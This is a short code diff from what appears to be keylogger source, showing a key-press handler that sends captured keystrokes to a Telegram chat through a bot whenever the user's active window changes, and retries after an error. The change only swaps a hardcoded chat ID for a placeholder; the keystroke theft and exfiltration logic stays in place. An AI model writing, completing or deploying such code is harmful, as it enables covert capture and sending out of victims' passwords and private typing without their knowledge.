@@ -33,7 +33,7 @@ def on_press_send_telegram(Key):
     try:
         if window != list_windows[-1]:
             try:
-                bot.sendMessage(chat_id='-1001089612663', text=keyboard)
+                bot.sendMessage(chat_id='chat_id', text=keyboard)
                 keyboard.clear()
             except:
                 time.sleep(60) #if happen any problem with telegram's API, this will happen: time.sleep going to wait for 60s and then 'listen' function will initialize again.
